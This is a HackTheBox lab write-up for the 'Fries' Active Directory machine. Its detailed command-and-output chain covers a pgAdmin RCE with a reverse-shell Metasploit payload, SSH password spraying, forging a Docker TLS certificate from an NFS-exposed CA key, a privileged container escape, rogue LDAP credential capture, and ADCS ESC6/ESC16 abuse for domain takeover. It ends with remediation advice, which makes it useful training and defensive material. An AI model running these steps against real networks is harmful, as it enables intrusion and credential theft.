# HackTheBox — Fries (Hard, Active Directory / Windows)

**Target IP:** `10.129.xx.xx`  **VPN/Attacker IP:** `10.10.xx.xx`  **Domain:** `fries.htb`  **Domain Controller:** `DC01.fries.htb`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```
nmap -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-24 10:31 +0545
Nmap scan report for 10.129.xx.xx
Host is up (0.72s latency).
Not shown: 983 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              nginx 1.18.0 (Ubuntu)
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: fries.htb)
443/tcp   open  ssl/https         nginx/1.18.0 (Ubuntu)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: fries.htb)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OSs: Linux, Windows
```

Notable findings:
- Standard AD DC footprint on `fries.htb`, hostname `DC01`
- **SSH (22) and WinRM (5985) are both open** — SSH is Linux-side, WinRM is the Windows DC
- Port 443 SSL cert reveals a virtual host: `pwm.fries.htb`
- ~7-hour clock skew noted for later Kerberos operations

### 1.2 /etc/hosts Configuration

```
10.129.xx.xx   DC01.fries.htb fries.htb pwm.fries.htb
```

---

## 2. Web Enumeration — Subdomain Discovery

### 2.1 Virtual Host Fuzzing

```
ffuf -u http://fries.htb -H "Host: FUZZ.fries.htb" \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 154
```

```
code   [Status: 200, Size: 13592, Words: 1048, Lines: 272, Duration: 257ms]
```

A `code.fries.htb` subdomain is discovered — this is a **Gitea** instance (confirmed later via Docker enumeration).

```
10.129.xx.xx   DC01.fries.htb fries.htb pwm.fries.htb code.fries.htb
```

### 2.2 Credentials Found in Gitea Source Code

Browsing the Gitea instance as `d.cooper@fries.htb` (credentials found in a repository) reveals a `.env` file containing database credentials:

```
DATABASE_URL=postgresql://root:<REDACTED_PASSWORD>@172.18.0.3:5432/ps_db
SECRET_KEY=<REDACTED_KEY>
```

A second subdomain `db-mgmt05.fries.htb` is also identified from repository content, hosting a **pgAdmin 4** instance.

---

## 3. Initial Access — CVE-2025-2945 (pgAdmin RCE)

### 3.1 Authenticated RCE via pgAdmin Query Tool

**CVE-2025-2945** affects pgAdmin 4 versions up to 9.1.0, allowing authenticated RCE via the query tool's file read/write functionality.

Using the credentials found in the `.env` file and the `d.cooper@fries.htb` account:

```
msf exploit(multi/http/pgadmin_query_tool_authenticated) > show options
```

```
Module options:
  DB_NAME    ps_db
  DB_PASS    <REDACTED_PASSWORD>
  DB_USER    root
  PASSWORD   <REDACTED_PASSWORD>
  RHOSTS     db-mgmt05.fries.htb
  RPORT      80
  USERNAME   d.cooper@fries.htb

Payload: python/meterpreter/reverse_tcp
  LHOST  10.10.xx.xx
  LPORT  4444
```

```
msf exploit(multi/http/pgadmin_query_tool_authenticated) > run
[*] Started reverse TCP handler on 10.10.xx.xx:4444
[+] The target appears to be vulnerable. pgAdmin version 9.1.0 is affected
[+] Successfully authenticated to pgAdmin
[+] Successfully initialized sqleditor
[*] Meterpreter session 1 opened (10.10.xx.xx:4444 -> 10.129.xx.xx:49824)

meterpreter > getuid
Server username: pgadmin
```

### 3.2 Credential Leakage via Container Environment

```
meterpreter > shell
id
uid=5050(pgadmin) gid=0(root) groups=0(root)

env
HOSTNAME=cb46692a4590
PGADMIN_DEFAULT_PASSWORD=<REDACTED_PASSWORD>
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
```

The pgAdmin container's environment variables expose the default admin password in plaintext.

---

## 4. SSH Access — Password Spray

### 4.1 Building a Username List

Known usernames assembled from Gitea, AD, and pgAdmin:

```
admin
d.cooper
svc
svc_infra
postgres
pgadmin
```

### 4.2 Spraying the pgAdmin Default Password via SSH

```
hydra -L users.txt -p '<REDACTED_PASSWORD>' ssh://10.129.xx.xx -vV -t 6
```

```
[22][ssh] host: 10.129.xx.xx   login: svc   password: <REDACTED_PASSWORD>
```

`svc` reuses the container's default pgAdmin password for SSH login.

```
ssh svc@10.129.xx.xx
svc@web:~$
```

The hostname `web` confirms this is the Linux web server (`192.168.100.2`), not the Windows DC.

---

## 5. Docker Escape — NFS + TLS Certificate Abuse

### 5.1 Docker Daemon Enumeration

```
svc@web:/home$ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 Feb 24 11:37 /var/run/docker.sock

svc@web:/home$ ps aux | grep dockerd
root  929  /usr/bin/dockerd -H fd:// --authorization-plugin=authz-broker \
  --tlsverify --tlscacert=/etc/docker/certs/ca.pem \
  --tlscert=/etc/docker/certs/server-cert.pem \
  --tlskey=/etc/docker/certs/server-key.pem -H=127.0.0.1:2376
```

Docker is exposed on `127.0.0.1:2376` with **mTLS enforced** — a client certificate signed by the server's CA is required. The `--authorization-plugin=authz-broker` plugin is also in place.

### 5.2 NFS Share Discovery

```
svc@web:/home$ ip route
172.18.0.0/16 dev br-0d1a963edc58 proto kernel scope link src 172.18.0.1
192.168.100.0/24 dev eth0 proto kernel scope link src 192.168.100.2
```

Scanning the Docker bridge host (`172.18.0.1`) reveals NFS (port 2049) is open. From the attacker machine via `sshuttle`:

```
sshuttle -r svc@10.129.xx.xx -N

showmount -e 192.168.100.2
Export list for 192.168.100.2:
/srv/web.fries.htb *

sudo mount -t nfs 192.168.100.2:/srv/web.fries.htb /mnt/fries_nfs
```

### 5.3 Accessing the Certificates Directory via GID Spoofing

```
ls -la /mnt/fries_nfs
drwxrwx--- 2 root 59605603 4096 May 26 2025 certs
drwxrwxrwx 2 root root     4096 Feb 24 2026 shared
drwxr----- 5 kali kali     4096 Jun  7 2025 webroot
```

The `certs` directory is owned by GID `59605603`. NFS doesn't enforce server-side group membership — creating a local group with that GID grants access:

```
sudo groupadd -g 59605603 fries_certs
sudo usermod -aG fries_certs kali
newgrp fries_certs

ls -la /mnt/fries_nfs/certs
-rw-r----- 1 root fries_certs 1708 Feb 24 2026 ca-key.pem
-rw-r----- 1 root fries_certs 1111 Feb 24 2026 ca.pem
-rw-r----- 1 root fries_certs 1115 Feb 24 2026 server-cert.pem
-rw-r----- 1 root fries_certs  940 Feb 24 2026 server.csr
-rw-r----- 1 root fries_certs 1704 Feb 24 2026 server-key.pem
```

The Docker daemon's CA private key (`ca-key.pem`) is readable. A valid client certificate can now be forged.

### 5.4 Generating a Rogue Client Certificate

```
openssl genrsa -out client-key.pem 4096

openssl req -new -key client-key.pem -out client.csr -subj "/CN=root"

openssl x509 -req -in client.csr -CA ca.pem -CAkey ca-key.pem \
  -CAcreateserial -out client-cert.pem -days 365
Certificate request self-signature ok
subject=CN=root
```

### 5.5 Connecting to the Docker Daemon

```
docker -H tcp://127.0.0.1:2376 --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=client-cert.pem \
  --tlskey=client-key.pem \
  ps -a
```

```
CONTAINER ID   IMAGE                   NAMES
f427ecaa3bdd   pwm/pwm-webapp:latest   pwm
cb46692a4590   dpage/pgadmin4:9.1.0    pgadmin4
bfe752a26695   fries-web               web
858fdf51af59   postgres:16             postgres
b916aad508e2   gitea/gitea:1.22.6      gitea
```

### 5.6 Privileged Container Escape to Root

```
docker -H tcp://127.0.0.1:2376 --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=client-cert.pem \
  --tlskey=client-key.pem \
  run -it --privileged -v /:/host fries-web /bin/bash

root@c2b17812c7c2:/app# chroot /host
# id
uid=0(root) gid=0(root) groups=0(root)
```

Mounting the host root filesystem (`/`) into a privileged container and `chroot`ing into it gives full root on the Linux host.

### 5.7 User Flag + SSH Private Key

```
# cat /home/svc/user.txt
<REDACTED_USER_FLAG>

# cat /root/.ssh/id_rsa
<REDACTED_PRIVATE_KEY>
```

```
chmod 600 id_rsa
ssh root@10.129.xx.xx -i id_rsa
root@web:~#
```

---

## 6. PWM Configuration — LDAP Credential Capture

### 6.1 PWM Config File

As root on the Linux host, the PWM (Password Management) configuration is readable:

```
root@web:~/scripts/pwm/config# cat PwmConfiguration.xml
```

Key findings:
- `configIsEditable` is set to `true` — the web UI requires no LDAP authentication to access
- A `configPasswordHash` bcrypt hash is present
- The LDAP proxy user is `CN=svc_infra,CN=Users,DC=fries,DC=htb`

### 6.2 Cracking the PWM Config Password

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
rockon!   (?)
```

The config password (`rockon!`) allows login to the PWM ConfigurationEditor web UI at `pwm.fries.htb`.

### 6.3 LDAP Credential Capture via PWM UI

<img width="1258" height="967" alt="Screenshot 2026-02-24 124309" src="https://github.com/user-attachments/assets/020a638a-8300-44fc-b95c-0c6f6ab3aa27" />

With config editor access, the LDAP server address can be redirected to the attacker machine. A Metasploit LDAP capture server is started:

```
msf auxiliary(server/capture/ldap) > run
[*] Server started.

[+] LDAP Login Attempt => From:10.129.xx.xx  Username: svc_infra  password:<REDACTED_PASSWORD>
```

PWM's "Test LDAP Profile" function triggers the bind, sending `svc_infra`'s credentials in cleartext to the rogue LDAP server.

### 6.4 Validating the Credentials

```
nxc ldap 10.129.xx.xx -u svc_infra -p '<REDACTED_PASSWORD>'
LDAP  10.129.xx.xx  389  DC01  [+] fries.htb\svc_infra:<REDACTED_PASSWORD>
```

---

## 7. Active Directory Enumeration — BloodHound

```
bloodhound-python -u 'svc_infra' -p '<REDACTED_PASSWORD>' \
  -d 'fries.htb' -dc 'DC01.fries.htb' -ns 10.129.xx.xx -c All
```

BloodHound reveals the following attack path:

```
svc_infra
  ↓ [ReadGMSAPassword]
gMSA_CA_prod$
  ↓ [WinRM / Manage CA rights]
DC01.fries.htb (Certificate Authority Officer)
```

### 7.1 Reading the GMSA Password

```
nxc ldap 10.129.xx.xx -u svc_infra -p '<REDACTED_PASSWORD>' --gmsa
LDAP  10.129.xx.xx  389  DC01  [*] Getting GMSA Passwords
LDAP  10.129.xx.xx  389  DC01  Account: gMSA_CA_prod$   NTLM: <REDACTED_NTLM_HASH>
                                PrincipalsAllowedToReadPassword: svc_infra
```

### 7.2 WinRM as gMSA_CA_prod$

```
nxc winrm 10.129.xx.xx -u 'gMSA_CA_prod$' -H '<REDACTED_NTLM_HASH>'
WINRM  10.129.xx.xx  5985  DC01  [+] fries.htb\gMSA_CA_prod$:<REDACTED_NTLM_HASH> (Pwn3d!)

evil-winrm -i 10.129.xx.xx -u 'gMSA_CA_prod$' -H '<REDACTED_NTLM_HASH>'
*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> whoami
fries\gmsa_ca_prod$
```

---

## 8. Privilege Escalation — ADCS Abuse (ESC6 + ESC16)

### 8.1 Adding gMSA_CA_prod$ as CA Officer

```
certipy-ad ca -u 'gMSA_CA_prod$' -hashes :<REDACTED_NTLM_HASH> \
  -ca 'fries-DC01-CA' \
  -target 'DC01.fries.htb' \
  -dc-ip 10.129.xx.xx \
  -add-officer 'gMSA_CA_prod$'

[*] Successfully added officer 'gMSA_CA_prod$' on 'fries-DC01-CA'
```

### 8.2 ESC6 — Enabling EDITF_ATTRIBUTESUBJECTALTNAME2

As a CA Officer, the `EditFlags` registry value can be modified to enable arbitrary SAN specification on any certificate request:

```powershell
$CA = New-Object -ComObject CertificateAuthority.Admin
$Config = "DC01.fries.htb\fries-DC01-CA"
$current = 1114446
$new = $current -bor 0x00040000
$CA.SetConfigEntry($Config, "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy", "EditFlags", $new)
```

Verification:

```
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\EditFlags
EditFlags REG_DWORD = 15014e (1376590)
  EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)   ← enabled
```

### 8.3 ESC16 — Disabling the SID Extension Check

To bypass the Strong Certificate Mapping (`1.3.6.1.4.1.311.25.2`) enforcement introduced in KB5014754, the extension is added to the CA's `DisableExtensionList`:

```powershell
$CA = New-Object -ComObject CertificateAuthority.Admin
$CA.SetConfigEntry("DC01.fries.htb\fries-DC01-CA",
  "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy",
  "DisableExtensionList", "1.3.6.1.4.1.311.25.2")

Restart-Service -Name CertSvc -Force
```

Verification:

```
certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg policy\DisableExtensionList
DisableExtensionList REG_SZ = 1.3.6.1.4.1.311.25.2
```

### 8.4 Requesting a Certificate Impersonating Administrator

With ESC6 active (arbitrary SAN) and ESC16 bypassing SID mapping enforcement, a certificate is requested for `Administrator` using `svc_infra`'s credentials:

```
certipy-ad req -u 'svc_infra@fries.htb' -p '<REDACTED_PASSWORD>' \
  -ca fries-DC01-CA \
  -template User \
  -subject "CN=Administrator,CN=Users,DC=fries,DC=htb" \
  -upn administrator@fries.htb \
  -sid 'S-1-5-21-858338346-3861030516-3975240472-500' \
  -dc-ip 10.129.xx.xx \
  -dcom

[*] Got certificate with UPN 'administrator@fries.htb'
[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

### 8.5 Synchronising the Clock

```
sudo ntpdate -u 10.129.xx.xx
CLOCK: time stepped by 25202.511924
```

### 8.6 Authenticating with the Certificate

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.xx.xx

[*] Got TGT
[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:<REDACTED_NTLM_HASH>
```

---

## 9. Domain Compromise

```
evil-winrm -i 10.129.xx.xx -u Administrator -H '<REDACTED_NTLM_HASH>'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
fries\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
<REDACTED_ROOT_FLAG>

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type user.txt
<REDACTED_USER_FLAG>
```

---

## 10. Attack Chain Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Nmap scan | AD DC (`fries.htb`), SSH on Linux host, WinRM on DC, `pwm.fries.htb` from SSL cert |
| 2 | Virtual host fuzzing (`ffuf`) | Discovered `code.fries.htb` (Gitea) |
| 3 | Gitea source code review | Found PostgreSQL credentials in `.env`; discovered `db-mgmt05.fries.htb` (pgAdmin) |
| 4 | CVE-2025-2945 — pgAdmin authenticated RCE | Meterpreter shell as `pgadmin` inside container |
| 5 | Read container environment variables | Leaked pgAdmin default password (`PGADMIN_DEFAULT_PASSWORD`) |
| 6 | SSH password spray with container password | `svc` confirmed reusing default password; SSH shell on Linux host |
| 7 | Docker daemon discovery | Docker TLS API on `127.0.0.1:2376`; mTLS enforced with `authz-broker` |
| 8 | NFS mount of `/srv/web.fries.htb` | Found `certs/` directory with Docker CA key protected by GID |
| 9 | Local GID spoofing | Matched GID `59605603` locally; read Docker CA key and server certs |
| 10 | Forged Docker client certificate | Signed client cert with CA key; authenticated to Docker daemon |
| 11 | Privileged container with host mount + chroot | Full root on Linux host; retrieved user flag and root SSH key |
| 12 | Read PWM `PwmConfiguration.xml` | Found `svc_infra` as LDAP proxy user; cracked config password (`rockon!`) |
| 13 | PWM ConfigEditor LDAP redirect + Metasploit capture server | Captured `svc_infra` cleartext credentials via rogue LDAP bind |
| 14 | BloodHound enumeration as `svc_infra` | `svc_infra` → `ReadGMSAPassword` → `gMSA_CA_prod$` |
| 15 | `nxc --gmsa` read gMSA NT hash | `gMSA_CA_prod$` NTLM hash recovered |
| 16 | WinRM as `gMSA_CA_prod$` | Shell on DC as gMSA account |
| 17 | `certipy-ad ca -add-officer` | `gMSA_CA_prod$` added as CA Officer on `fries-DC01-CA` |
| 18 | ESC6 — enabled `EDITF_ATTRIBUTESUBJECTALTNAME2` | CA now accepts caller-supplied SAN on any template |
| 19 | ESC16 — disabled SID extension (`1.3.6.1.4.1.311.25.2`) | Bypassed Strong Certificate Mapping enforcement |
| 20 | `certipy-ad req` with Administrator UPN + SID | Certificate issued for `administrator@fries.htb` |
| 21 | `certipy-ad auth` → PKINIT → NT hash | Administrator NT hash retrieved via certificate authentication |
| 22 | `evil-winrm` with Administrator hash | Full domain compromise; root flag captured |

---

## 11. Tools Used

- `nmap` — port/service scanning
- `ffuf` — virtual host fuzzing
- `Metasploit` (`pgadmin_query_tool_authenticated`) — CVE-2025-2945 RCE
- `Metasploit` (`auxiliary/server/capture/ldap`) — rogue LDAP credential capture
- `hydra` — SSH password spray
- `sshuttle` — transparent proxy through SSH for internal network access
- `showmount` / `mount` — NFS share enumeration and mounting
- `openssl` — forging Docker TLS client certificate from exposed CA key
- `docker` (remote TLS) — privileged container escape with host filesystem mount
- `john` — bcrypt hash cracking (PWM config password)
- `bloodhound-python` — AD enumeration and attack path analysis
- `nxc` (NetExec) — LDAP auth, GMSA password retrieval, WinRM access
- `certipy-ad` — ADCS CA officer operations, ESC6/ESC16 exploitation, certificate request and authentication
- `evil-winrm` — WinRM shell sessions
- `ntpdate` — Kerberos clock synchronisation

---

## 12. Key Takeaways / Remediation

1. **Credentials in Source Code and Container Environment Variables:** Database credentials were committed to a Gitea repository, and the pgAdmin default password was exposed via `env` in the container. Secrets must never be stored in source control or container environment variables — use a secrets manager (Vault, AWS Secrets Manager) and inject at runtime via mounted secrets.

2. **Default Passwords Reused Across Services:** The pgAdmin default password was reused as the SSH password for the `svc` OS account. Default application passwords should be rotated immediately at deployment and should never be reused across services or accounts.

3. **Docker CA Private Key Accessible via NFS:** The Docker daemon's CA private key was stored on an NFS share, readable by anyone who could match the owning GID. NFS relies on client-side UID/GID claims and cannot enforce server-side group membership. Secrets such as CA keys must never be stored on NFS shares — they should remain exclusively on the host filesystem with strict permissions.

4. **Docker Daemon Exposed with Forged-Certificate Risk:** While mTLS was enforced on the Docker API, the CA key being obtainable via NFS made it trivial to forge a valid client certificate. mTLS only provides security if the CA private key is protected. The `--authorization-plugin=authz-broker` plugin provided no meaningful additional control once client cert forgery was achieved.

5. **Privileged Docker Containers with Host Filesystem Mount:** Running `--privileged` containers with `-v /:/host` is functionally equivalent to giving root on the host to anyone who can run containers. Privileged containers should be banned by policy, and `AppArmor`/`seccomp` profiles enforced. Volume mounts should follow least-privilege (no host root mounts).

6. **PWM Configured in Editable Mode (`configIsEditable=true`):** PWM's configuration editor was accessible without LDAP authentication, allowing redirection of the LDAP proxy bind to an attacker-controlled server. `configIsEditable` must be set to `false` in production. LDAP bind operations should additionally use LDAPS or STARTTLS to prevent credential capture even if a redirect is achieved.

7. **GMSA ReadPassword Granted to Broad Service Account:** `svc_infra` — reachable via the PWM LDAP capture — had `ReadGMSAPassword` rights over `gMSA_CA_prod$`. `PrincipalsAllowedToRetrieveManagedPassword` should be scoped to only the specific hosts or services that genuinely need to authenticate as the gMSA.

8. **CA Officer Rights Leading to ESC6/ESC16:** `gMSA_CA_prod$` could self-assign CA Officer rights and then modify `EditFlags` and `DisableExtensionList` to enable arbitrary SAN issuance while bypassing Strong Certificate Mapping. CA Officer and CA Manager roles must be restricted to dedicated privileged admin accounts and regularly audited. `EDITF_ATTRIBUTESUBJECTALTNAME2` should never be enabled on enterprise CAs, and Strong Certificate Mapping (`KB5014754`) should remain enforced on all domain controllers.

---

*Flags and sensitive values (passwords, hashes, private keys) have been redacted. IP addresses replaced with placeholders (`10.129.xx.xx` for target, `10.10.xx.xx` for attacker/VPN) per the established convention.*
